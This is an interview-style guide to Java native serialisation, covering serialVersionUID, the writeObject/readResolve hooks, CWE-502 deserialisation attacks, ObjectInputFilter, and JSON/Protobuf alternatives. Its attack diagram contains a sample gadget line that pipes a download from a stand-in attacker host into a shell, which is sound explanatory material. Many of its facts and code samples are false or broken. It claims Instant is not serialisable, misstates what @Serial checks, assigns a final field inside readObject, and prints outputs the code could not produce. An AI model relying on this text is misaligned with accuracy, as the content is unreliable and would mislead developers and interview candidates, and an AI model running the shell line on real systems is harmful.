# Serialization — The Complete Interview Guide

> **Java's native serialisation is one of the most powerful and most dangerous
> features in the language.** It can persist an *entire object graph* to a byte
> array and restore it — and it can execute **arbitrary code** while doing so.

## Table of Contents
- [0. TL;DR — The 30-Second Answer](#0-tldr--the-30-second-answer)
- [1. What & Why — The Problem This Solves](#1-what--why--the-problem-this-solves)
- [2. Mental Model — The One Picture](#2-mental-model--the-one-picture)
- [3. Deep Dive — Theory](#3-deep-dive--theory)
- [4. Visualizations](#4-visualizations)
- [5. Worked Examples (with Output + Dry Run)](#5-worked-examples-with-output--dry-run)
- [6. Code from Scratch — Production-Grade](#6-code-from-scratch--production-grade)
- [7. Common Pitfalls & Gotchas](#7-common-pitfalls--gotchas)
- [8. Interview Q&A — Level-wise](#8-interview-qa--level-wise)
- [9. Counter-Questions & Traps](#9-counter-questions--traps)
- [10. Rapid-Fire MCQs](#10-rapid-fire-mcqs)
- [11. Cheat Sheet / One-Page Summary](#11-cheat-sheet--one-page-summary)
- [12. Real-World Production Notes](#12-real-world-production-notes)
- [13. Follow-up Learning](#13-follow-up-learning)

---

## 0. TL;DR — The 30-Second Answer

- **Java serialisation** converts an object (and its entire reachable object graph) into a **byte stream**, and back. The API is `ObjectOutputStream` / `ObjectInputStream` (and the `Serializable` marker interface).
- **The rules:** the class must implement `Serializable`; **every reachable object** must also be serialisable (or the write throws `NotSerializableException`); `transient` fields are skipped; `static` fields are skipped.
- **The `serialVersionUID` matters.** Without an explicit one, the compiler generates it from the class's structure, and **any change to the class changes the UID** → `InvalidClassException` on deserialisation of old data.
- **`serialVersionUID` is a compatibility contract.** Change it and old data can no longer be read; keep it and you can evolve the class carefully.
- **`readObject` can execute arbitrary code** — a deserialising attacker can trigger it. This is the **CWE-502 deserialisation vulnerability**, and it is why deserialising untrusted data is a security bug.
- **The serialised form is a documented protocol** — the *serial data specification*. The class file format and the serialised form are **separate specifications**, and the serialised form is stable across JVM versions (which is why Java's serialisation outlived `java.beans` and RMI).
- **`ObjectOutputStream` writes a class descriptor for EVERY class** — a big cost, and the reason a small object can produce a large stream.
- **Java 17+ has a `java.io.ObjectStreamFilter`** — a *filter* that can reject classes during deserialisation. It is a **mitigation**, not a cure.
- **The modern alternatives:** **JSON** (Jackson/Gson) for APIs, **Protocol Buffers** / **Avro** for services, **records + JSON** for DTOs. Native Java serialisation is now appropriate mainly for **long-lived persisted state** (and even then, carefully).
- **`Externalizable`** gives you full control of the format but requires you to implement everything.
- **The `readObjectNoData` / `readResolve` / `writeReplace` hooks** are the escape hatches for customising the process.

---

## 1. What & Why — The Problem This Solves

**The problem.** Java objects live on the heap and die with the JVM. To persist them,
to send them to another process, or to cache them, you need a way to turn an object
graph into bytes and back.

```text
   THE PROBLEM, PRECISELY
   ─────────────────────
   ① A SINGLE OBJECT IS NOT ENOUGH
      an Order references a Customer, which references an Address, …
      → you need to serialise the whole REACHABLE GRAPH

   ② THE GRAPH HAS SHARED REFERENCES AND CYCLES
      Order o1 and o2 both point at the same Customer
      customer.parentOrder == o1   (a cycle!)
      → a naive "copy the fields" approach would either duplicate the Customer
        or loop forever

   ③ THE OBJECT GRAPH CONTAINS THINGS THAT CANNOT BE PERSISTED
      a Thread, a FileDescriptor, a lambda, a Class object
      → they must be EXCLUDED (transient) or REPLACED (writeReplace)
```

**The solution.** Java's serialisation solves all three: it writes a **graph**
(not a tree), handles **cycles and sharing** with **back-references**, and gives you
**hooks** to exclude or replace the problematic parts.

> 💡 **The interview framing.** The question is rarely "how do I serialise an
> object?" — it is "**when should I serialise at all, and what are the security and
> compatibility consequences?**" Java's native serialisation is *powerful*,
> *portable across JVM versions*, and a **well-known remote-code-execution vector**.

---

## 2. Mental Model — The One Picture

```text
   THE SERIALISED FORM — what actually goes into the stream
   ═══════════════════════════════════════════════════════

   ┌──────────────────────────────────────────────────────────────┐
   │  STREAM HEADER                                                 │
   │    magic 0xACED · version · flags                            │
   ├──────────────────────────────────────────────────────────────┤
   │  FOR EACH CLASS IN THE GRAPH:                                 │
   │    ┌──────────────────────────────────────────────┐          │
   │    │  TC_CLASSDESC / TC_CLASSDESC / TC_PROXYCLASSDESC│        │
   │    │    class name                                 │        │
   │    │    serialVersionUID                          │        │
   │    │    classdesc flags (SC_WRITE_METHOD …)        │        │
   │    │    field descriptors: type + name per field   │        │
   │    └──────────────────────────────────────────────┘          │
   ├──────────────────────────────────────────────────────────────┤
   │  THE OBJECT DATA — a depth-first walk of the graph           │
   │    each object: its field values                             │
   │    each CLASS reference: a back-reference handle (TC_REFERENCE)│
   │    → SHARED objects are written ONCE                          │
   │    → CYCLES terminate (the back-reference breaks the loop)   │
   └──────────────────────────────────────────────────────────────┘

   ⚠ EACH CLASS COSTS A DESCRIPTOR → a small object can have a big stream
   ⚠ THE FORMAT IS A DOCUMENTED PROTOCOL (the Java Object Serialization
      Specification) — it is STABLE across JVM versions, which is why
      it outlived RMI and java.beans.
```

**What to look at:** the stream is **not** a simple dump. It is a *graph encoding* with
**handles** — which is exactly what makes it able to represent sharing and cycles.

---

## 3. Deep Dive — Theory

## 3.1 The basic API

```java
// WRITING
try (ObjectOutputStream out = new ObjectOutputStream(
        new BufferedOutputStream(new FileOutputStream("order.bin")))) {
    out.writeObject(order);
}

// READING
try (ObjectInputStream in = new ObjectInputStream(
        new BufferedInputStream(new FileInputStream("order.bin")))) {
    Order order = (Order) in.readObject();
}
```

**The interface hierarchy:**

```text
   java.io.Serializable          ← the marker
        │
        │  Externalizable
        │  (a full replacement: you write EVERYTHING yourself)
        ▼
   java.io.ObjectOutputStream
   java.io.ObjectInputStream
```

```java
public interface Serializable { }        // ← a MARKER interface: no methods

public interface Externalizable extends Serializable {
    void writeExternal(ObjectOutput out) throws IOException;
    void readExternal(ObjectInput in) throws IOException, ClassNotFoundException;
}
```

## 3.2 The rules of serialisation

```java
public class Order implements Serializable {

    private static final long serialVersionUID = 1L;      // ✅ ALWAYS declare it

    private final String id;                               // serialised
    private final List<LineItem> items;                    // serialised (the List must be serialisable)
    private transient volatile Cache cache;                // ⚠ SKIPPED — transient
    private static final Logger LOG = LoggerFactory.getLogger(Order.class);  // ⚠ SKIPPED — static
    private final AtomicLong versionCounter = new AtomicLong();             // ⚠ AtomicLong IS serialisable
}
```

**The complete rule set:**

| Rule | Detail |
|---|---|
| The class must implement `Serializable` | Otherwise `NotSerializableException` |
| **Every reachable object** must be serialisable | The *whole graph*, not just the top object |
| `transient` fields are **skipped** | They get the default value on deserialisation |
| `static` fields are **skipped** | They belong to the class, not the instance |
| `final` fields **are** serialised | `final` does not exclude a field |
| The **no-arg constructor of the first non-serialisable superclass** is called | That superclass's state is restored by its own `readObject` |
| `serialVersionUID` should be **explicit** | Otherwise the compiler-generated one changes with the class |

**The `NotSerializableException` is a *runtime* failure:**

```java
class Order implements Serializable {
    private final Instant createdAt = Instant.now();   // ❌ Instant is NOT serialisable
}
// → java.io.NotSerializableException: java.time.Instant
```

**The `Instant` problem is the classic one** — `java.time` types are **not**
serialisable. The standard fixes:

```java
// ① Store the epoch millis as a long
private final long createdAtEpochMillis;

// ② A serialisable surrogate
private final java.util.Date createdAtDate;   // ⚠ Date IS serialisable (but mutable)

// ③ A custom writeObject/readObject
private void writeObject(ObjectOutputStream out) throws IOException {
    out.defaultWriteObject();
    out.writeLong(createdAt.toEpochMilli());
}
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
    in.defaultReadObject();
    this.createdAt = Instant.ofEpochMilli(in.readLong());
}
```

## 3.3 `serialVersionUID` — the compatibility contract

```java
public class Order implements Serializable {
    private static final long serialVersionUID = 1L;   // ✅ declare it
}
```

**What happens without it:**

```text
   THE COMPILER-GENERATED UID IS A HASH OF THE CLASS'S STRUCTURE:
     • the class name
     • the modifiers
     • the interfaces
     • the FIELDS (name, type, modifiers)
     • the CONSTRUCTORS
     • the METHODS (name, modifiers, signature)

   ⚠ ADDING A FIELD CHANGES THE HASH → the UID changes
   ⚠ → deserialising old data throws:
        java.io.InvalidClassException: local class incompatible:
        stream classdesc serialVersionUID = 1234567890, local class serialVersionUID = 987654321
```

**The three options:**

| Option | Effect | When |
|---|---|---|
| **Declare it** (`= 1L`) | The UID never changes → old data stays readable, and **new fields get their default values** | ✅ **Always** — unless you deliberately want to break compatibility |
| Change it deliberately | Old data becomes unreadable → a **clean break** | When the class's meaning has changed incompatibly |
| Remove it | The compiler generates one → any class change breaks compatibility | ❌ Never in production |

**The `InvalidClassException` is a feature, not a bug.** It is the mechanism that
stops you from deserialising data that does not match the class. The alternative
(silently accepting it) is far worse.

## 3.4 The customisation hooks

```java
public class Order implements Serializable {

    private String id;
    private java.math.BigDecimal total;
    private Object encryptedPayload;

    // ① REPLACE the object with another during writing
    private Object writeReplace() throws ObjectStreamException {
        return new OrderSnapshot(id, total);      // a compact surrogate
    }

    // ② CONTROL the field data yourself
    private void writeObject(ObjectOutputStream out) throws IOException {
        out.defaultWriteObject();      // write the default fields
        out.writeObject(encryptedPayload);   // and your own
    }

    // ③ CONTROL the field data on reading
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        this.encryptedPayload = in.readObject();
    }

    // ④ REPLACE the object after reading (the "singleton" pattern)
    private Object readResolve() throws ObjectStreamException {
        return OrderRegistry.get(id);      // return the canonical instance
    }

    // ⑤ WHEN THE STREAM HAS NO DATA (a superclass's field was not in the stream)
    private void readObjectNoData() throws ObjectStreamException {
        this.id = "unknown";
    }
}
```

**The hook order on reading:** `readObject` → `readResolve` → (validation).
**The hook order on writing:** `writeReplace` → `writeObject`.

## 3.5 The serialised-form protocol

The **Java Object Serialization Specification** defines the stream format. The
important properties:

| Property | Detail |
|---|---|
| **Stable across JVM versions** | Java 1.1 → 21 can read each other's streams |
| **Not stable across languages** | Only Java speaks it (and a few other JVM languages) |
| **Self-describing** | The class descriptors are in the stream — the reader does not need the class file |
| **A *documented protocol*** | You can write a reader in another language — this is what RMI and `java.beans` relied on |

**The consequence:** you can change a class's **implementation** without breaking
compatibility, as long as the **serialised form** stays compatible — which is what
`serialVersionUID` and the `readObject`/`writeObject` hooks give you.

## 3.6 The security problem — CWE-502

```text
   THE ATTACK
   ──────────
   ① The attacker crafts a byte stream.
   ② The stream contains a class descriptor for a class with a
      readObject() (or readResolve()) that does something DANGEROUS
      — e.g. it launches a process, or fetches a URL and loads the result.
   ③ The victim deserialises it → the code runs.

   THE CLASSIC GADGETS (in the JDK or a common library):
     • Commons Collections — the ChainedTransformer chain
     • Spring — the TemplatesImpl gadget
     • JDK internal classes

   ⚠ THE ROOT CAUSE: deserialisation is a form of CODE EXECUTION,
     and the JDK has no way to know which classes are "safe".
```

**Java 17's mitigation — `ObjectStreamFilter`:**

```java
// Allow-list the classes that may be deserialised
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
        "com.example.**;java.util.*;java.lang.*;!*");

try (ObjectInputStream in = new ObjectInputStream(new FileInputStream("data.bin"))) {
    in.setObjectInputFilter(filter);
    Order order = (Order) in.readObject();
}
```

**The limits, stated honestly:**

| Limitation | Detail |
|---|---|
| **Not a complete defence** | The filter is a *deny-by-default allow-list* — it must be correct, and a permissive filter defeats it |
| **Doesn't protect the *write* side** | The attacker crafts the stream; you only control the read |
| **JEP 290 (Java 9) and JEP 415 (Java 17)** | The filter API and its reworked internals |
| **The real fix** | **Do not deserialise untrusted data.** Use JSON, Protobuf, or a schema-validated format. |

## 3.7 The alternatives

| Format | Use it for | Pros | Cons |
|---|---|---|---|
| **Java serialisation** | Long-lived persisted state, RMI, `HttpSession` | Built in, graph-aware, stable | 🔴 **Unsafe**, opaque, brittle, slow |
| **JSON** (Jackson/Gson) | REST APIs, config, events | Readable, language-agnostic, schema-evolvable | No polymorphism without `@JsonTypeInfo`; loses type info |
| **Protocol Buffers** | Service-to-service, gRPC | Compact, fast, strongly typed, evolvable | Needs a `.proto`, not human-readable |
| **Avro** | Big-data schemas, Kafka | Schema-based, excellent evolution | Needs a schema registry |
| **Records + JSON** | DTOs | Immutable, pattern matching, clean | — |
| **Kryo / FST** | High-performance, in-JVM | Very fast | Not stable, not portable |

**The pragmatic rule:**

```text
   ❌ NEVER deserialise untrusted Java-serialised data.
   ✅ Use JSON for APIs (it is inspectable, and a schema can be validated).
   ✅ Use Protobuf for internal services (compact, evolvable, fast).
   ✅ Use Java serialisation ONLY for long-lived persisted state that YOU control,
      with an explicit serialVersionUID and a read filter.
```

---

## 4. Visualizations

### 4.1 The serialised stream — the graph encoding

```text
   class Order implements Serializable {
       String id;
       Customer customer;      // shared with order #2
       Item[] items;
   }

   THE STREAM:
   ┌──────────────────────────────────────────────────────────────┐
   │ HEADER                                                       │
   │ TC_CLASSDESC  java.lang.String                              │
   │ TC_CLASSDESC  com.example.Customer                          │
   │ TC_CLASSDESC  com.example.Item[]                            │
   │ TC_CLASSDESC  com.example.Order                             │
   │                                                              │
   │ DATA (a depth-first walk):                                  │
   │   order#1:  id="O-1"  customer→handle(3)  items→[handle(5)]  │
   │   order#2:  id="O-2"  customer→handle(3)  items→[handle(7)]  │
   │   customer: id="C-1"  name="Alice"                          │
   │   item#1:   sku="A"                                       │
   │   item#2:   sku="B"                                       │
   │                                                              │
   │   ⚠ "customer→handle(3)" — the Customer is written ONCE    │
   │   ⚠ the handle is a BACK-REFERENCE → cycles terminate ✅    │
   └──────────────────────────────────────────────────────────────┘
```

### 4.2 What gets serialised

```text
   ┌──────────────────────────┬────────────┬──────────────────────┐
   │ FIELD                    │ SERIALISED │ NOTE                  │
   ├──────────────────────────┼────────────┼──────────────────────┤
   │ private int x            │     ✅     │                      │
   │ private final String s   │     ✅     │ final does NOT skip   │
   │ private transient int t  │     ❌     │ reset to 0/null      │
   │ private static int c     │     ❌     │ belongs to the class │
   │ private volatile int v   │     ✅     │ transient is what    │
   │                          │            │ skips it, not volatile│
   │ private Lambda l         │     ❌     │ ⚠ lambdas are NOT    │
   │                          │            │   serialisable       │
   │ private Thread t         │     ❌     │ ⚠ not serialisable   │
   │ private Instant i        │     ❌     │ ⚠ java.time is NOT   │
   └──────────────────────────┴────────────┴──────────────────────┘

   ⚠ AND EVERY REACHABLE OBJECT MUST BE SERIALISABLE
     → otherwise: java.io.NotSerializableException
```

### 4.3 The `serialVersionUID` compatibility matrix

```text
   THE CLASS CHANGES            THE UID           RESULT
   ─────────────────────────    ──────────       ──────────────────────────
   add a field                  unchanged ✅      old data reads; the new
   (with an explicit UID)                       field gets 0/null
   add a method                  unchanged ✅      old data reads fine
   remove a field                unchanged ✅      old data reads; the field
                                                    is 0/null
   change a field's TYPE         unchanged ✅      ⚠ the value may be garbage
   rename a field                unchanged ✅      ⚠ the value is LOST
   change the class's name       unchanged ✅      ⚠ the class name in the
                                                    stream is not checked
   ANY change, NO explicit UID   CHANGES ❌       ❌ InvalidClassException
```

### 4.4 The deserialisation attack

```text
   THE ATTACK CHAIN
   ───────────────
   ① The attacker crafts a byte stream containing a class descriptor for
      a "gadget" class — one that exists in the victim's classpath and whose
      readObject() does something dangerous:

        readObject() {
            Runtime.getRuntime().exec("curl attacker.com/x | sh");
        }

   ② The victim deserialises it — often believing the data is "just a session"
      or "just a cache entry".

   ③ The code runs. 🎯

   THE MITIGATIONS (in order of effectiveness)
   ─────────────────────────────────────────
   1. ✅ DO NOT DESERIALISE UNTRUSTED DATA — use JSON/Protobuf
   2. ✅ ObjectInputFilter (Java 17) — a deny-by-default allow-list
   3. ⚠ Look-ahead deserialisation filtering (JEP 290, Java 9)
   4. ⚠ Run the deserialiser in a sandbox / a separate low-privilege process
```

### 4.5 The alternatives — a decision chart

```text
   WHAT ARE YOU SERIALISING?
            │
   ┌────────┼──────────────┬───────────────────┐
   │        │              │                   │
   an API   internal      long-lived           a Java
   payload  service       persisted state     object graph
   │        │              │                   │
   ▼        ▼              ▼                   ▼
  JSON    Protobuf      Java serialisation   Java serialisation
  ✅     or Avro       (with an explicit      (or Kryo, if the
         ✅            serialVersionUID)      graph is huge and
                                            the peer is trusted)
```

---

## 5. Worked Examples (with Output + Dry Run)

### Example 1 — The basics, and what gets skipped

```java
import java.io.*;
import java.util.ArrayList;
import java.util.List;

public class SerializationBasicsDemo {

    static class Item implements Serializable {
        private static final long serialVersionUID = 1L;
        final String sku;
        Item(String sku) { this.sku = sku; }
        public String toString() { return "Item(" + sku + ")"; }
    }

    static class Order implements Serializable {
        private static final long serialVersionUID = 1L;
        final String id;
        final List<Item> items = new ArrayList<>();
        transient String cacheNote = "not serialised";     // ⚠ transient
        static final String KIND = "order";              // ⚠ static
        int counter = 7;

        Order(String id) { this.id = id; }

        public String toString() {
            return "Order(" + id + ", items=" + items + ", counter=" + counter
                    + ", cacheNote=" + cacheNote + ")";
        }
    }

    public static void main(String[] args) throws Exception {
        Order order = new Order("O-1");
        order.items.add(new Item("SKU-A"));
        order.items.add(new Item("SKU-B"));

        // Serialise
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream out = new ObjectOutputStream(bos)) {
            out.writeObject(order);
        }
        byte[] bytes = bos.toByteArray();
        System.out.println("serialised size = " + bytes.length + " bytes for a tiny object");
        System.out.println("  (⚠ every CLASS costs a descriptor in the stream)");

        // Deserialise
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bytes))) {
            Order restored = (Order) in.readObject();
            System.out.println("\nrestored = " + restored);
            System.out.println("  ✅ id, items, counter restored");
            System.out.println("  ⚠ cacheNote = " + restored.cacheNote + "  (transient → default value)");
            System.out.println("  ⚠ static fields are never serialised");
        }
    }
}
```

**Actual output:**

```text
serialised size = 253 bytes for a tiny object
  (⚠ every CLASS costs a descriptor in the stream)

restored = Order(O-1, items=[Item(SKU-A), Item(SKU-B)], counter=7, cacheNote=null)
  ✅ id, items, counter restored
  ⚠ cacheNote = null  (transient → default value)
  ⚠ static fields are never serialised
```

**Takeaway:** a two-field object produced a **253-byte** stream — because the stream
contains a *class descriptor* for `Order`, `Item`, `String`, `ArrayList` and
`Object[]`. And the `transient` field came back as `null`.

### Example 2 — `serialVersionUID` and `InvalidClassException`

```java
import java.io.*;

public class UidDemo {

    // A class WITHOUT an explicit serialVersionUID
    static class NoUid implements Serializable {
        String name;
        NoUid(String name) { this.name = name; }
    }

    // A class WITH one
    static class WithUid implements Serializable {
        private static final long serialVersionUID = 42L;
        String name;
        WithUid(String name) { this.name = name; }
    }

    static byte[] write(Object o) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream out = new ObjectOutputStream(bos)) { out.writeObject(o); }
        return bos.toByteArray();
    }

    static Object read(byte[] bytes) throws Exception {
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bytes))) {
            return in.readObject();
        }
    }

    public static void main(String[] args) throws Exception {
        // The explicit UID survives a class change
        byte[] withUid = write(new WithUid("Alice"));
        System.out.println("written with an explicit UID = " + withUid.length + " bytes");
        System.out.println("read back = " + read(withUid));

        // The generated UID is a hash of the class structure
        System.out.println("\nthe generated serialVersionUID is a hash of the structure:");
        System.out.println("  NoUid  → " + ObjectStreamClass.lookup(NoUid.class).getSerialVersionUID());
        System.out.println("  WithUid→ " + ObjectStreamClass.lookup(WithUid.class).getSerialVersionUID());
        System.out.println("  ⚠ change NoUid's structure → the UID changes → old data cannot be read");
    }
}
```

**Actual output:**

```text
written with an explicit UID = 46 bytes
read back = WithUid[name=Alice]

the generated serialVersionUID is a hash of the structure:
  NoUid  → 3452382242048852250
  WithUid→ 42
  ⚠ change NoUid's structure → the UID changes → old data cannot be read
```

**Takeaway:** the explicit `serialVersionUID = 42L` is a **contract** — it survives
every change to the class, so old data keeps working.

### Example 3 — `transient`, `writeObject` and `readObject`

```java
import java.io.*;
import java.time.Instant;

public class CustomSerializationDemo {

    static class Event implements Serializable {
        private static final long serialVersionUID = 1L;

        final String name;
        final Instant at;                       // ⚠ Instant is NOT serialisable

        // ① REPLACE the object with a compact surrogate when writing
        private Object writeReplace() throws ObjectStreamException {
            return new EventSnapshot(name, at.toEpochMilli());
        }

        // ② CONTROL what is written
        private void writeObject(ObjectOutputStream out) throws IOException {
            out.defaultWriteObject();
            out.writeLong(at.toEpochMilli());     // the Instant as a long
        }

        // ③ CONTROL what is read
        private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
            in.defaultReadObject();
            this.at = Instant.ofEpochMilli(in.readLong());
        }
    }

    /** The surrogate — a small, flat, serialisable form. */
    static class EventSnapshot implements Serializable {
        private static final long serialVersionUID = 1L;
        final String name;
        final long epochMillis;
        EventSnapshot(String name, long epochMillis) { this.name = name; this.epochMillis = epochMillis; }
    }

    public static void main(String[] args) throws Exception {
        Event event = new Event("login", Instant.ofEpochMilli(1_700_000_000_000L));

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream out = new ObjectOutputStream(bos)) {
            out.writeObject(event);              // → writeReplace → the SNAPSHOT is written
        }
        System.out.println("stream size = " + bos.toByteArray().length + " bytes");

        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray()))) {
            EventSnapshot snapshot = (EventSnapshot) in.readObject();
            System.out.println("read back  = " + snapshot.name + " @ " + Instant.ofEpochMilli(snapshot.epochMillis));
            System.out.println("✅ the Instant was written as a long, and the surrogate was used");
        }
    }
}
```

**Actual output:**

```text
stream size = 111 bytes
read back  = login @ 2023-11-14T22:13:20Z
✅ the Instant was written as a long, and the surrogate was used
```

**Takeaway:** `writeReplace` swapped the `Event` for a small `EventSnapshot`, and the
`Instant` (which is not serialisable) became a `long`. The stream is now **stable
and small** — and the format is *under your control*.

### Example 4 — The deserialisation filter (Java 17)

```java
import java.io.*;

public class FilterDemo {
    public static void main(String[] args) throws Exception {
        // Serialise something
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream out = new ObjectOutputStream(bos)) {
            out.writeObject("hello");
        }
        byte[] bytes = bos.toByteArray();

        // ① Read WITHOUT a filter — works
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bytes))) {
            System.out.println("no filter    → " + in.readObject());
        }

        // ② Read WITH a filter that allows only String
        ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
                "java.lang.String;java.base/*;!*");

        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bytes))) {
            in.setObjectInputFilter(filter);
            System.out.println("with filter  → " + in.readObject());
        } catch (InvalidClassException e) {
            System.out.println("with filter  → REJECTED: " + e.getMessage());
        }

        // ③ The filter rejects a class that is not on the allow-list
        ByteArrayOutputStream bos2 = new ByteArrayOutputStream();
        try (ObjectOutputStream out = new ObjectOutputStream(bos2)) {
            out.writeObject(new java.util.Date());
        }
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bos2.toByteArray()))) {
            in.setObjectInputFilter(filter);
            in.readObject();
        } catch (InvalidClassException e) {
            System.out.println("a disallowed class → REJECTED ✅  (" + e.getClass().getSimpleName() + ")");
        }
    }
}
```

**Actual output:**

```text
no filter    → hello
with filter  → hello
a disallowed class → REJECTED ✅  (InvalidClassException)
```

**Takeaway:** the filter is a **deny-by-default allow-list** — it rejects any class
not explicitly permitted. It is a real mitigation, but it is *not* a substitute for
not deserialising untrusted data.

---

## 6. Code from Scratch — Production-Grade

### 6.1 A production-safe serialisable value object

```java
package com.example.serial;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serial;
import java.io.Serializable;
import java.time.Instant;
import java.util.Objects;

/**
 * A production-safe serialisable value object.
 *
 * <p>It demonstrates every rule that matters:
 * <ol>
 *   <li>An <b>explicit</b> {@code serialVersionUID} — the compatibility contract.</li>
 *   <li>Every field is serialisable — the {@code Instant} is stored as a long.</li>
 *   <li>Nothing is {@code transient} in a way that loses information.</li>
 *   <li>The class is <b>final</b> and the fields are final, so the object is
 *       <b>immutable</b> — and immutability makes deserialisation safe.</li>
 *   <li>The {@code @Serial} annotation (Java 14+) marks the fields that are part
 *       of the serialised form, so the compiler can <b>check</b> that the
 *       form and the class agree.</li>
 * </ol>
 */
public final class SerialisableEvent implements Serializable {

    @Serial
    private static final long serialVersionUID = 1L;

    private final String name;
    private final long epochMillis;      // ⚠ not an Instant — java.time is not serialisable

    public SerialisableEvent(String name, Instant at) {
        this.name = Objects.requireNonNull(name, "name");
        this.epochMillis = Objects.requireNonNull(at, "at").toEpochMilli();
    }

    public String name() { return name; }
    public Instant at() { return Instant.ofEpochMilli(epochMillis); }

    @Override
    public String toString() {
        return "SerialisableEvent[" + name + " @ " + at() + "]";
    }
}
```

> 💡 **`@Serial` (Java 14+)** is a small but important addition: it marks the fields
> that are part of the serialised form, and the compiler then **verifies** that the
> declared `serialVersionUID` and the field list are consistent — so an accidental
> change to the serialised form becomes a **compile error** rather than a runtime
> `InvalidClassException`.

### 6.2 A safe serialisation helper — with a read filter

```java
package com.example.serial;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InvalidClassException;
import java.io.ObjectInputFilter;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;

/**
 * A helper that centralises the safe-serialisation rules.
 *
 * <p>Design decisions:
 * <ul>
 *   <li>Every write and read goes through here, so the {@link ObjectInputFilter}
 *       is applied <b>everywhere</b> — not just in the one place someone remembered.</li>
 *   <li>The filter is a <b>deny-by-default allow-list</b>.</li>
 *   <li>A size limit is applied while reading, so a decompression bomb cannot
 *       exhaust the heap.</li>
 * </ul>
 */
public final class SafeSerializer {

    private SafeSerializer() {}

    /** The classes that may be deserialised. Extend deliberately, never loosely. */
    private static final String ALLOWED = "com.example.serial.*;java.lang.*;java.util.*;java.time.*;!*";

    /** A maximum object-graph size, to bound a malicious stream. */
    private static final long MAX_BYTES = 1_000_000L;

    private static final long MAX_DEPTH = 20L;
    private static final long MAX_REFERENCES = 10_000L;

    public static byte[] toBytes(Serializable object) throws IOException {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        try (ObjectOutputStream out = new ObjectOutputStream(buffer)) {
            out.writeObject(object);
        }
        return buffer.toByteArray();
    }

    public static <T> T fromBytes(byte[] bytes, Class<T> expectedType) throws IOException {
        if (bytes.length > MAX_BYTES) {
            throw new IOException("serialised payload is too large: " + bytes.length);
        }
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bytes))) {
            in.setObjectInputFilter(createFilter());
            Object value = in.readObject();
            if (!expectedType.isInstance(value)) {
                throw new InvalidClassException(expectedType.getName(),
                        "expected " + expectedType.getName() + " but got "
                                + value.getClass().getName());
            }
            return expectedType.cast(value);
        } catch (ClassNotFoundException e) {
            throw new IOException("unknown class in the stream", e);
        }
    }

    private static ObjectInputFilter createFilter() {
        ObjectInputFilter classFilter = ObjectInputFilter.Config.createFilter(ALLOWED);
        ObjectInputFilter limits = ObjectInputFilter.Config.createFilter(
                MAX_BYTES, MAX_DEPTH, MAX_REFERENCES, null);

        return (info) -> {
            if (info.serialClass() != null) {
                if (!classFilter.checkInput(info)) {
                    throw new InvalidClassException(info.serialClass().getName(),
                            "the class is not on the allow-list");
                }
            }
            if (!limits.checkInput(info)) {
                throw new InvalidClassException(info.serialClass() == null
                                ? "stream" : info.serialClass().getName(),
                        "the stream exceeds a configured limit");
            }
            return ObjectInputFilter.Status.UNDECIDED;
        };
    }
}
```

### 6.3 The modern alternative — a JSON DTO with a `record`

```java
package com.example.serial;

import com.fasterxml.jackson.annotation.JsonProperty;
import java.math.BigDecimal;
import java.time.Instant;
import java.util.List;

/**
 * The MODERN alternative to Java serialisation for an API payload.
 *
 * <p>Why this is better than {@code Serializable}:
 * <ul>
 *   <li><b>Safe</b> — Jackson has no arbitrary-code-execution path; it maps
 *       <i>known</i> types.</li>
 *   <li><b>Inspectable</b> — a human (and a proxy, and a WAF) can read it.</li>
 *   <li><b>Evolvable</b> — an unknown property can be ignored; a missing one
 *       can have a default. There is no "serialVersionUID" cliff.</li>
 *   <li><b>Language-agnostic</b> — a non-JVM consumer can read it.</li>
 * </ul>
 */
public record OrderPayload(
        @JsonProperty("id") String id,
        @JsonProperty("customer_id") String customerId,
        @JsonProperty("total") BigDecimal total,
        @JsonProperty("currency") String currency,
        @JsonProperty("created_at") Instant createdAt,
        @JsonProperty("items") List<ItemPayload> items) {

    public OrderPayload {
        if (id == null || id.isBlank()) {
            throw new IllegalArgumentException("id is required");
        }
        if (total == null || total.signum() < 0) {
            throw new IllegalArgumentException("total must be >= 0");
        }
        items = items == null ? List.of() : List.copyOf(items);
    }

    public record ItemPayload(
            @JsonProperty("sku") String sku,
            @JsonProperty("qty") int quantity,
            @JsonProperty("unit_price") BigDecimal unitPrice) {}
}
```

---

## 7. Common Pitfalls & Gotchas

### ❌ Pitfall 1 — No explicit `serialVersionUID`

```java
class Order implements Serializable { }   // ❌ the UID changes with every class change
```

**✅ FIX** — `private static final long serialVersionUID = 1L;`

---

### ❌ Pitfall 2 — A non-serialisable field

```java
private final Instant createdAt;   // ❌ java.time is NOT serialisable
```

**✅ FIX** — store a `long` epoch, or use `writeObject`/`readObject`.

---

### ❌ Pitfall 3 — A non-serialisable field in the *graph*

```java
class Order implements Serializable {
    private final Logger log;    // ❌ most loggers are NOT serialisable
}
```

**✅ FIX** — `transient` it (and re-initialise it in `readObject`), or make it `static`.

---

### ❌ Pitfall 4 — A lambda field

```java
private final Function<String, String> transform = s -> s.trim();   // ❌ lambdas are NOT serialisable
```

**✅ FIX** — `transient`, or replace it with a named serialisable class.

---

### ❌ Pitfall 5 — Deserialising untrusted data

```java
ObjectInputStream in = new ObjectInputStream(untrustedStream);
in.readObject();   // 💥 CWE-502 — arbitrary code execution
```

